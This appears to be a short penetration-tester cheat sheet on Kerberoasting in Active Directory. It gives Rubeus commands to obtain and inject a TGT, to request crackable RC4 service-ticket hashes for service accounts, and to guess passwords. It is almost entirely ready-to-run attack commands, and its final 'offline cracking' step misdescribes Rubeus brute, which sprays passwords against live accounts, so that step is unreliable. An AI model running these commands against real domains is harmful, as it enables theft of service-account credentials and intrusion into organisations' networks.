# Kerberoasting

Request a kerberos ticket for a service account that you can crack offline

First need a TGT in your session, valid with `klist`.

If you don't have one (say, from a purge of tickets), you can reaquire by asking for and injecting your TGT for the user with credentials:
```powershell
Rubeus asktgt /user:<username> /password:<password> /ptt
```

Use Rubeus to search for a vulnerable service account and request a service ticket
```powershell
Rubeus.exe kerberoast

[*] Hash: $krb5tgs$23$*<account>$<domain>$<account>@<domain>*$...
```

The krb5tgs$23$ indicates an RC4 encrypted Kerberos service ticket.

Crack offline with:
```powershell
Rubeus brute /user:<username> /passwords:<password_list>
```



